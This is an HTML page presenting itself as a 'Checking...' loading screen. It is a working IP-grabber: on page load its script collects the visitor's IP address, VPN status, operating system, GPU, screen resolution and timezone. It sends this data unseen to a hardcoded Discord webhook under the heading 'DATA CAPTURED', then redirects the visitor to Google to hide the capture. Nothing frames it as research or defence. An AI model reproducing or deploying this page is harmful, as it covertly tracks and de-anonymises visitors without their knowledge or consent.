<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Checking...</title>
    <style>
        body { background:#000; margin:0; display:flex; align-items:center; justify-content:center; height:100vh; overflow:hidden; }
        .l { border:3px solid #111; border-top:3px solid #0f0; border-radius:50%; width:30px; height:30px; animation:s 1s linear infinite; }
        @keyframes s { to { transform:rotate(360deg); } }
    </style>
</head>
<body>
    <div class="l"></div>
    <script>
        (function() {
            "use strict";

            const config = {
                hook: "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL",
                target: "https://www.google.com"
            };

            const run = async () => {
                let sys = {
                    os: navigator.platform,
                    res: screen.width + "x" + screen.height,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    gpu: "Unknown",
                    ip: "N/A"
                };

                // GPU extraction
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    sys.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                } catch(e) {}

                // IP & VPN Extraction
                try {
                    const r = await fetch('https://ipapi.co/json/');
                    const j = await r.json();
                    sys.ip = j.ip;
                    sys.vpn = (j.timezone !== sys.tz) ? "ðŸš¨ YES" : "âœ… NO";
                } catch(e) { sys.vpn = "âš ï¸ Error"; }

                // Payload Construction
                const msg = {
                    embeds: [{
                        title: "ðŸ’€ DATA CAPTURED",
                        color: 3066993,
                        fields: [
                            { name: "ðŸ“¡ Network", value: "IP: " + sys.ip + "\nVPN: " + sys.vpn, inline: true },
                            { name: "âš™ï¸ System", value: "OS: " + sys.os + "\nGPU: " + sys.gpu, inline: false },
                            { name: "ðŸ–¥ï¸ Display", value: "Res: " + sys.res + "\nTZ: " + sys.tz, inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                // Ultimate Transmission
                const data = JSON.stringify(msg);
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(config.hook, new Blob([data], { type: 'application/json' }));
                } else {
                    fetch(config.hook, { method: 'POST', mode: 'no-cors', body: data });
                }

                // Redirect
                setTimeout(() => { window.location.replace(config.target); }, 1200);
            };

            window.onload = run;
        })();
    </script>
</body>
</html>
